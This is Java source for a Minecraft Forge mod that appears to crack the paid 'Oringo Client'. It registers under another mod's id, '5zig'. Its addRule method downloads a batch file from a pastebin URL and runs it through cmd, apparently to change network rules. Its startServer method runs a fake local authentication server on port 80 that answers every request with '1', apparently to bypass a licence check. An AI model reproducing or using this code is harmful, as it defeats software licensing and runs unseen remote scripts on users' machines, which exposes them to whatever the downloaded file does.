package com.skyblock.oringocrack;

import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import org.apache.commons.io.FileUtils;
import org.lwjgl.opengl.Display;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

@Mod(modid = OringoCrack.MOD_ID, version = OringoCrack.VERSION)
public class OringoCrack {
    public static final String MOD_ID = "5zig";
    public static final String VERSION = "6.9";

    @Mod.EventHandler
    public void init(FMLInitializationEvent event) {
        Display.setTitle("Oringo Client - Cracked by Lory & fe");
    }

    // auto netsh rule
    public static void addRule() throws IOException, InterruptedException {
        Process p;
        if (!new File(FileUtils.getUserDirectory() + "\\OringoRule.bat").exists()) {
            URL website = new URL("https://pastebin.com/raw/NG2quFHR");
            ReadableByteChannel rbc = Channels.newChannel(website.openStream());
            FileOutputStream fos = new FileOutputStream(FileUtils.getUserDirectory() + "\\OringoRule.bat");
            fos.getChannel().transferFrom(rbc, 0L, Long.MAX_VALUE);
            fos.close();
            rbc.close();
        }
        p = Runtime.getRuntime().exec("cmd /c \"%USERPROFILE%\\OringoRule.bat");
        p.waitFor();
    }

    // local auth server
    // creds to my babe Lory for original code uwu
    public static void startServer() throws IOException {
        ServerSocket s = new ServerSocket(80);
        new Thread(() -> {
            while (true) {
                try {
                    Socket socket = s.accept();
                    BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                    while (in.readLine() != null) {
                        out.println("HTTP/1.1 200 OK");
                        out.println("Content-Type: text/html");
                        out.println("");
                        out.println("1");
                        out.close();
                    }
                } catch (IOException ignored) {
                }
            }
        }).start();
    }
}
